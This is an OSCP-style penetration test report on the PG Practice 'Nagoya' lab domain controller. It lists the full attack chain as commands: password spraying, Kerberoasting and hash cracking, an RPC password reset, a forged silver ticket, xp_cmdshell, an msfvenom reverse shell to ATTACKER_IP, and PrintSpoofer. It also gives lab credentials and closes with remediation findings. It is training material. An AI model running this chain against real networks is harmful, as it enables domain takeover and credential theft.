# PG Practice Nagoya - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-4-17

---

## 1. Executive Summary

A penetration test was conducted against the target host 192.168.133.21 within the nagoya-industries.com domain.

The assessment identified multiple critical weaknesses in Active Directory configuration, including AS-REP roasting, Kerberoasting, weak password policies, and misconfigured services. These issues allowed full domain compromise and privilege escalation to Administrator.

---

## 2. Scope

- **Target:** 192.168.133.21
- **Environment:** PG Practice Nagoya
- **Testing Window:** 2026-4-13 to 2026-4-17
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-port scan was run with Nmap:

Command:

```
nmap -p- -sC -sV 192.168.133.21 -T4 -oA nagoya_tcp
```

Output (relevant):

```
53/tcp    domain
80/tcp    http (IIS 10.0)
88/tcp    kerberos
135/tcp   rpc
139/tcp   netbios
389/tcp   ldap
445/tcp   smb
636/tcp   ldap ssl
3268/tcp  global catalog
3389/tcp  rdp
5985/tcp  winrm
```

Interpretation:

The target is a Windows Domain Controller exposing LDAP, Kerberos, SMB, and WinRM services, indicating an Active Directory environment.

---

## 5. Enumeration

### SMB Enumeration

Command:

```
smbclient -L //192.168.133.21 -N
```

Output:

```
Anonymous login successful
```

Interpretation:

Anonymous access was allowed but did not reveal useful shares.

### LDAP Enumeration (Unauthenticated)

Command:

```
ldapsearch -x -H ldap://192.168.133.21 -s base namingcontexts
```

Output:

```
Access denied / unable to bind
```

Interpretation:

Unauthenticated LDAP queries were restricted.

### Web Enumeration

Command:

```
gobuster dir -u http://192.168.133.21 -w directory-list-2.3-medium.txt
```

Interpretation:

A list of users was found in the `/teams` directory. The application used ASP.NET Core.

### Username Enumeration

Command:

```
kerbrute userenum -d nagoya-industries.com --dc nagoya-industries.com usernames.txt
```

Interpretation:

Valid domain usernames were identified.

---

## 6. Initial Access

### AS-REP Roasting

Command:

```
GetNPUsers.py nagoya-industries.com/ -dc-ip 192.168.133.21 -usersfile usernames.txt -no-pass
```

Interpretation:

Initial attempt did not yield usable hashes.

### Password Spraying

Command:

```
netexec smb nagoya-industries.com -u usernames.txt -p passwords.txt
```

Output:

```
fiona.clark : Summer2023
```

Interpretation:

Valid credentials were obtained via weak password policy.

### Credentialed LDAP Enumeration

Command:

```
ldapsearch -x -H ldap://nagoya-industries.com -D "fiona.clark@nagoya-industries.com" -w 'Summer2023' -b "DC=nagoya-industries,DC=com"
```

Interpretation:

Additional usernames were collected.

### Kerberoasting

Command:

```
GetUserSPNs.py 'nagoya-industries.com/fiona.clark:Summer2023' -dc-ip 192.168.133.21 -request
```

Output:

```
svc_mssql
svc_helpdesk
```

Interpretation:

Service accounts with SPNs were identified and targeted.

### Hash Cracking

Command:

```
hashcat -m 13100 -a 0 hashes.kerberoast rockyou.txt
```

Output:

```
svc_mssql : Service1
```

Interpretation:

A service account password was successfully recovered.

---

## 7. Post-Exploitation

### SMB Share Download

Command:

```
smbclient //192.168.133.21 -U svc_mssql%Service1 -c 'recurse ON; prompt OFF; mget *'
```

Interpretation:

SYSVOL and NETLOGON were downloaded for further analysis.

### BloodHound Enumeration

Command:

```
bloodhound-python -d nagoya-industries.com -u svc_mssql -p 'Service1' -ns 192.168.133.21 -c All --zip
```

Interpretation:

Attack paths within Active Directory were identified.

### Credential Discovery

Reverse engineering revealed:

```
svc_helpdesk : U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
```

Interpretation:

Additional privileged credentials were obtained.

### RPC Abuse

Command:

```
rpcclient -U nagoya-industries/svc_helpdesk 192.168.133.21
```

Command:

```
setuserinfo christopher.lewis 23 'NewP@ss123'
```

Interpretation:

A user password was reset, enabling lateral movement.

### WinRM Access

Command:

```
evil-winrm -i nagoya-industries.com -u christopher.lewis -p 'NewP@ss123'
```

Interpretation:

A shell was obtained as a domain user.

---

## 8. Privilege Escalation

### Local Enumeration

Command:

```
whoami /priv
```

Output:

```
SeImpersonatePrivilege enabled
```

Interpretation:

The system is vulnerable to token impersonation attacks.

### Silver Ticket Attack

Command:

```
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-... -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
```

Interpretation:

A forged Kerberos ticket was created for Administrator.

### MSSQL Access via Kerberos

Command:

```
proxychains impacket-mssqlclient -k nagoya.nagoya-industries.com
```

Interpretation:

Authenticated access to MSSQL was achieved as Administrator.

### Enable xp_cmdshell

Command:

```
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Reverse Shell Execution

Command:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o rev.exe
```

Command:

```
xp_cmdshell "C:\Windows\Tasks\rev.exe"
```

Interpretation:

A reverse shell was obtained as svc_mssql.

### Privilege Escalation via PrintSpoofer

Command:

```
PrintSpoofer64.exe -i -c cmd.exe
```

Output:

```
NT AUTHORITY\SYSTEM
```

Interpretation:

Full SYSTEM privileges were obtained.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\local.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Weak Domain Password Policy

**Severity:** High

**Description:**
The domain password policy allowed weak or easily guessable passwords, including common seasonal patterns.

**Impact:**
Attackers could guess or crack user credentials, leading to unauthorized access and potential privilege escalation.

**Recommendation:**
Enforce strong password complexity requirements, implement account lockout policies, and monitor authentication attempts.

### **Finding:** Kerberoastable Service Accounts

**Severity:** Critical

**Description:**
Service accounts exposed Service Principal Names (SPNs) and used weak passwords, making them vulnerable to Kerberoasting attacks.

**Impact:**
Attackers could request service tickets, perform offline password cracking, and gain access to privileged accounts.

**Recommendation:**
Use strong, complex passwords for service accounts, implement Managed Service Accounts where possible, and regularly audit SPNs.

### **Finding:** Excessive Privileges Allowing Password Reset via RPC

**Severity:** Critical

**Description:**
Users were granted excessive privileges that allowed them to reset passwords of other accounts via RPC or directory services.

**Impact:**
Attackers could reset passwords of privileged users, leading to privilege escalation and lateral movement.

**Recommendation:**
Restrict permissions on user management operations, review delegated privileges, and enforce least-privilege access controls.

### **Finding:** SeImpersonatePrivilege Assigned to Service Account

**Severity:** Critical

**Description:**
A service account possessed the SeImpersonatePrivilege privilege, allowing token impersonation attacks.

**Impact:**
Attackers could exploit token impersonation techniques to escalate privileges to SYSTEM.

**Recommendation:**
Remove unnecessary impersonation privileges, harden service account permissions, and monitor for abnormal privilege usage.

### **Finding:** Database Command Execution via xp_cmdshell

**Severity:** High

**Description:**
The database service allowed execution of operating system commands through functionality such as `xp_cmdshell`.

**Impact:**
Attackers could execute arbitrary system commands, potentially leading to full system compromise.

**Recommendation:**
Disable `xp_cmdshell`, restrict database permissions, and ensure database services run with minimal privileges.

---

## 11. Appendix

NTLM Hash Generator -
[https://codebeautify.org/ntlm-hash-generator](https://codebeautify.org/ntlm-hash-generator)